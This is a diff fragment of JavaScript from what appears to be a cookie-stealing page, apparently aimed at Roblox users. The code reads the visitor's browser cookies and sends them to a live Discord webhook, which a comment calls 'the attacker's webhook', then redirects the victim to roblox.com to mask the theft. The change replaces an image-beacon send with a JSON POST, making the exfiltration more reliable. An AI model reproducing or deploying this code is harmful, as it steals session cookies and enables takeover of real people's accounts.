@@ -9,8 +9,10 @@
         var cookies = document.cookie;
 
         // Send the cookies to the attacker's webhook
-        var img = new Image();
-        img.src = "https://discord.com/api/webhooks/1378476423521767556/-dH-zQTsl40SkfY6I2e-T9qKltq7ukHMTWfVqRSVAipYLSxhxXa5idC0q5PgV2ZpYiro" + encodeURIComponent(cookies);
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1378476423521767556/-dH-zQTsl40SkfY6I2e-T9qKltq7ukHMTWfVqRSVAipYLSxhxXa5idC0q5PgV2ZpYiro", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({cookies: cookies}));
 
         // Redirect to roblox.com
         window.location.href = "https://www.roblox.com";
